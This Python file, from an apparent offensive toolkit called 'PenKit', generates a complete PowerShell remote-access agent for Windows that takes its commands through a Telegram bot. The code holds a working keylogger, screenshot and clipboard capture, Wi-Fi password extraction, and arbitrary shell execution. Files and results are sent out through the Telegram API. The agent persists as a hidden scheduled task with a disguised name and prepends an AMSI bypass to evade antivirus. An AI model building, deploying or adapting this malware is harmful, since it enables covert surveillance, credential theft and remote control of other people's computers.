"""
Telegram C2 Agent Generator.

Erzeugt ein PowerShell-Skript das auf dem Ziel-Windows läuft und:
  - Alle N Sekunden Telegram auf neue Befehle prüft (Invoke-RestMethod, builtin)
  - Befehle ausführt und Ergebnisse zurückschickt
  - Screenshots aufnimmt und als Foto sendet
  - Keylogger startet/stoppt
  - Clipboard überwacht
  - Dateien hoch-/runterlädt
  - Sich selbst persistiert (Scheduled Task)

Operator-Seite: normales Telegram — kein extra Tool nötig.
Befehle werden mit ! eingeleitet (z.B. !shell whoami).

Architektur:
  Operator (Telegram App) → Telegram API ← Agent (Windows PS1)
                                          → Ergebnisse zurück →
"""

from __future__ import annotations
import textwrap

# ── Befehlsliste ──────────────────────────────────────────────────────────────
COMMANDS = {
    "!shell <cmd>":      "Shell-Befehl ausführen (cmd.exe)",
    "!ps <cmd>":         "PowerShell-Befehl ausführen",
    "!screenshot":       "Screenshot aufnehmen und senden",
    "!sysinfo":          "Systeminformationen (OS, User, IP, Domäne)",
    "!whoami":           "Aktueller Benutzer + Rechte",
    "!ls <pfad>":        "Verzeichnis auflisten (default: C:\\)",
    "!cat <datei>":      "Dateiinhalt lesen",
    "!download <datei>": "Datei an Telegram senden",
    "!clipboard":        "Zwischenablage lesen",
    "!keylog start":     "Keylogger starten",
    "!keylog stop":      "Keylogger stoppen + Log senden",
    "!keylog dump":      "Aktuellen Keylog senden ohne zu stoppen",
    "!wifi":             "Gespeicherte WLAN-Passwörter auslesen",
    "!browsers":         "Browser-Passwörter (Pfade zu Credential-Stores)",
    "!persist":          "Als Scheduled Task persistieren",
    "!unpersist":        "Scheduled Task entfernen",
    "!exit":             "Agent beenden",
    "!help":             "Befehle auflisten",
}

# ── PowerShell Keylogger (via SetWindowsHookEx, C# Add-Type) ──────────────────
_KEYLOGGER_CS = r"""
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public class KL {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr _hook = IntPtr.Zero;
    private static StringBuilder _buf = new StringBuilder();
    private static string _logPath;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc cb, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr h, uint min, uint max);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] static extern short GetKeyState(int k);
    [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint msg; public IntPtr wParam; public IntPtr lParam; public uint time; public POINT pt; }
    [StructLayout(LayoutKind.Sequential)] public struct POINT { public int x, y; }
    [StructLayout(LayoutKind.Sequential)] public struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr extra; }

    public static void Start(string logPath) {
        _logPath = logPath;
        using (var proc = System.Diagnostics.Process.GetCurrentProcess())
        using (var mod  = proc.MainModule)
            _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(mod.ModuleName), 0);
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) != 0) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
    }

    public static void Stop() { if (_hook != IntPtr.Zero) UnhookWindowsHookEx(_hook); }

    public static string Dump() { return _buf.ToString(); }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            var s = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool caps  = (GetKeyState(0x14) & 0x0001) != 0;
            string key = ((System.Windows.Forms.Keys)s.vkCode).ToString();
            string c   = key.Length == 1 ? (shift ^ caps ? key.ToUpper() : key.ToLower()) : $"[{key}]";
            _buf.Append(c);
            try { File.AppendAllText(_logPath, c); } catch {}
        }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }
}
"""

# ── Screenshot helper ─────────────────────────────────────────────────────────
_SCREENSHOT_PS1 = r"""
function Take-Screenshot {
    param([string]$Path)
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $scr  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp  = New-Object System.Drawing.Bitmap($scr.Width, $scr.Height)
    $gfx  = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen($scr.Location, [System.Drawing.Point]::Empty, $scr.Size)
    $bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
    $gfx.Dispose(); $bmp.Dispose()
    return $Path
}
"""

# ── Telegram helpers ──────────────────────────────────────────────────────────
_TG_HELPERS_PS1 = r"""
function TG-Send {
    param([string]$Text)
    $body = @{ chat_id=$TG_CHAT; text=$Text; parse_mode="HTML" } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "$TG_API/sendMessage" -Method POST `
            -ContentType "application/json" -Body $body -ErrorAction Stop | Out-Null
    } catch {}
}

function TG-SendPhoto {
    param([string]$FilePath, [string]$Caption="")
    try {
        $form = @{ chat_id=$TG_CHAT; caption=$Caption; photo=Get-Item $FilePath }
        Invoke-RestMethod -Uri "$TG_API/sendPhoto" -Method POST -Form $form -ErrorAction Stop | Out-Null
    } catch {}
}

function TG-SendDocument {
    param([string]$FilePath, [string]$Caption="")
    try {
        $form = @{ chat_id=$TG_CHAT; caption=$Caption; document=Get-Item $FilePath }
        Invoke-RestMethod -Uri "$TG_API/sendDocument" -Method POST -Form $form -ErrorAction Stop | Out-Null
    } catch {}
}

function TG-GetUpdates {
    param([int]$Offset=0)
    try {
        $r = Invoke-RestMethod -Uri "$TG_API/getUpdates?offset=$Offset&timeout=5" -ErrorAction Stop
        return $r.result
    } catch { return @() }
}
"""

# ── Befehlsverarbeitung ───────────────────────────────────────────────────────
_CMD_HANDLER_PS1 = r"""
function Handle-Command {
    param([string]$Text, [int]$MsgId)

    if ($Text -eq "!help") {
        $msg = "<b>PenKit C2 Agent</b>`n`n"
        $msg += "!shell &lt;cmd&gt;    — CMD-Befehl`n"
        $msg += "!ps &lt;cmd&gt;       — PowerShell`n"
        $msg += "!screenshot       — Screenshot`n"
        $msg += "!sysinfo          — Systeminfo`n"
        $msg += "!whoami           — User + Rechte`n"
        $msg += "!ls &lt;pfad&gt;       — Verzeichnis`n"
        $msg += "!cat &lt;datei&gt;     — Datei lesen`n"
        $msg += "!download &lt;pfad&gt; — Datei senden`n"
        $msg += "!clipboard        — Zwischenablage`n"
        $msg += "!keylog start/stop/dump`n"
        $msg += "!wifi             — WLAN-Passwörter`n"
        $msg += "!persist          — Persistenz`n"
        $msg += "!exit             — Agent beenden"
        TG-Send $msg
        return
    }

    if ($Text -like "!shell *") {
        $cmd = $Text.Substring(7)
        try {
            $out = cmd /c $cmd 2>&1 | Out-String
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($out.Trim()))</pre>"
        } catch { TG-Send "[!] Fehler: $_" }
        return
    }

    if ($Text -like "!ps *") {
        $cmd = $Text.Substring(4)
        try {
            $out = Invoke-Expression $cmd 2>&1 | Out-String
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($out.Trim()))</pre>"
        } catch { TG-Send "[!] Fehler: $_" }
        return
    }

    if ($Text -eq "!screenshot") {
        $path = "$env:TEMP\ss_$(Get-Date -Format yyyyMMdd_HHmmss).png"
        Take-Screenshot -Path $path
        TG-SendPhoto -FilePath $path -Caption "Screenshot $(Get-Date -Format 'dd.MM.yyyy HH:mm')"
        Remove-Item $path -ErrorAction SilentlyContinue
        return
    }

    if ($Text -eq "!sysinfo") {
        $ip  = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
        $loc = try { (Invoke-RestMethod "https://ipinfo.io/$ip/json" -ErrorAction SilentlyContinue) } catch { $null }
        $msg  = "<b>System Info</b>`n"
        $msg += "Host    : $env:COMPUTERNAME`n"
        $msg += "User    : $env:USERNAME`n"
        $msg += "Domain  : $env:USERDOMAIN`n"
        $msg += "OS      : $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
        $msg += "IP Ext  : $ip`n"
        if ($loc) { $msg += "Location: $($loc.city), $($loc.country)`n" }
        $msg += "IP Int  : $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)`n"
        $msg += "RAM     : $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)) GB`n"
        $msg += "AV      : $((Get-MpComputerStatus -ErrorAction SilentlyContinue).AMProductVersion)`n"
        $msg += "Uptime  : $((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime)"
        TG-Send $msg
        return
    }

    if ($Text -eq "!whoami") {
        $priv = whoami /priv 2>&1 | Select-String "SeDebug|SeTcb|SeImpersonate" | Out-String
        $grp  = whoami /groups 2>&1 | Select-String "Admin|SYSTEM" | Out-String
        TG-Send "<pre>$(whoami)`n$priv`n$grp</pre>"
        return
    }

    if ($Text -like "!ls*") {
        $path = if ($Text.Length -gt 4) { $Text.Substring(4).Trim() } else { "C:\" }
        try {
            $items = Get-ChildItem $path -ErrorAction Stop |
                Select-Object Mode, LastWriteTime, Length, Name |
                Format-Table -AutoSize | Out-String
            TG-Send "<pre>$path`n$($items.Trim())</pre>"
        } catch { TG-Send "[!] $_" }
        return
    }

    if ($Text -like "!cat *") {
        $path = $Text.Substring(5).Trim()
        try {
            $content = Get-Content $path -Raw -ErrorAction Stop
            if ($content.Length -gt 3800) { $content = $content.Substring(0,3800) + "`n[gekürzt...]" }
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($content))</pre>"
        } catch { TG-Send "[!] $_" }
        return
    }

    if ($Text -like "!download *") {
        $path = $Text.Substring(10).Trim()
        if (Test-Path $path) {
            TG-SendDocument -FilePath $path -Caption "Download: $path"
        } else { TG-Send "[!] Datei nicht gefunden: $path" }
        return
    }

    if ($Text -eq "!clipboard") {
        Add-Type -AssemblyName System.Windows.Forms
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($clip))</pre>" }
        else        { TG-Send "[*] Zwischenablage leer." }
        return
    }

    if ($Text -eq "!keylog start") {
        if (-not $script:KLJob) {
            $script:KLLog  = "$env:TEMP\kl_$(Get-Random).tmp"
            $script:KLJob  = Start-Job -ScriptBlock {
                param($cs, $lp)
                Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Windows.Forms
                [KL]::Start($lp)
            } -ArgumentList $KL_CS, $script:KLLog
            TG-Send "[+] Keylogger gestartet. Log: $script:KLLog"
        } else { TG-Send "[*] Keylogger läuft bereits." }
        return
    }

    if ($Text -eq "!keylog stop") {
        if ($script:KLJob) {
            Stop-Job $script:KLJob; Remove-Job $script:KLJob
            $script:KLJob = $null
            if (Test-Path $script:KLLog) {
                TG-SendDocument -FilePath $script:KLLog -Caption "Keylog (final)"
                Remove-Item $script:KLLog -ErrorAction SilentlyContinue
            }
            TG-Send "[*] Keylogger gestoppt."
        } else { TG-Send "[*] Kein Keylogger aktiv." }
        return
    }

    if ($Text -eq "!keylog dump") {
        if (Test-Path $script:KLLog) {
            $log = Get-Content $script:KLLog -Raw
            if ($log.Length -gt 3800) { $log = $log.Substring(0,3800) + "[...]" }
            TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($log))</pre>"
        } else { TG-Send "[*] Kein Keylog vorhanden." }
        return
    }

    if ($Text -eq "!wifi") {
        $profiles = netsh wlan show profiles 2>&1 |
            Select-String "Profil\s*:\s*(.+)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
        $result = "WLAN Passwörter:`n"
        foreach ($p in $profiles) {
            $details = netsh wlan show profile name="$p" key=clear 2>&1 |
                Select-String "Schlüsselinhalt|Key Content" | Out-String
            $pw = if ($details -match ":\s*(.+)$") { $Matches[1].Trim() } else { "(kein Passwort)" }
            $result += "  $p  →  $pw`n"
        }
        TG-Send "<pre>$result</pre>"
        return
    }

    if ($Text -eq "!persist") {
        $scriptPath = "$env:APPDATA\Microsoft\Windows\svchost_helper.ps1"
        Copy-Item $PSCommandPath $scriptPath -Force -ErrorAction SilentlyContinue
        $action  = New-ScheduledTaskAction -Execute "powershell" -Argument "-ep bypass -w hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden
        Register-ScheduledTask -TaskName "WindowsHelperService" -Action $action `
            -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
        TG-Send "[+] Persistiert als Scheduled Task 'WindowsHelperService' (bei Anmeldung)"
        return
    }

    if ($Text -eq "!unpersist") {
        Unregister-ScheduledTask -TaskName "WindowsHelperService" -Confirm:$false -ErrorAction SilentlyContinue
        TG-Send "[*] Scheduled Task entfernt."
        return
    }

    if ($Text -eq "!exit") {
        TG-Send "[*] Agent beendet."
        exit 0
    }
}
"""

# ── Haupt-Loop ────────────────────────────────────────────────────────────────
_MAIN_LOOP_PS1 = r"""
# ── Startup ──
Add-Type -AssemblyName System.Web
$script:KLJob = $null
$script:KLLog = ""
$offset = 0

TG-Send "<b>Agent online</b>`n$env:USERNAME@$env:COMPUTERNAME`n$(Get-Date -Format 'dd.MM.yyyy HH:mm')`nTipp: !help"

# ── Poll loop ──
while ($true) {
    $updates = TG-GetUpdates -Offset $offset
    foreach ($u in $updates) {
        $offset = $u.update_id + 1
        $text = $u.message.text
        if ($text -and $text.StartsWith("!")) {
            Handle-Command -Text $text.Trim() -MsgId $u.message.message_id
        }
    }
    Start-Sleep -Seconds {INTERVAL}
}
"""


def generate(
    token: str,
    chat_id: str,
    interval: int = 10,
    include_amsi_bypass: bool = True,
) -> str:
    """
    Generates the complete Windows PS1 agent.

    Parameters
    ----------
    token    : Telegram Bot Token (from @BotFather)
    chat_id  : Telegram Chat ID (your personal chat with the bot)
    interval : Polling interval in seconds (default 10)
    include_amsi_bypass : Prepend AMSI+ETW bypass (recommended)
    """
    from tools.c2.amsi_bypass import get_inline_bypass

    bypass = get_inline_bypass() if include_amsi_bypass else ""

    header = textwrap.dedent(f"""
        # PenKit C2 Agent — Telegram
        $TG_TOKEN = "{token}"
        $TG_CHAT  = "{chat_id}"
        $TG_API   = "https://api.telegram.org/bot$TG_TOKEN"
        $KL_CS    = @'
        {_KEYLOGGER_CS.strip()}
        '@
    """).strip()

    main = _MAIN_LOOP_PS1.replace("{INTERVAL}", str(interval))

    parts = []
    if bypass:
        parts.append(bypass)
    parts += [header, _SCREENSHOT_PS1.strip(), _TG_HELPERS_PS1.strip(),
              _CMD_HANDLER_PS1.strip(), main.strip()]

    return "\n\n".join(parts)
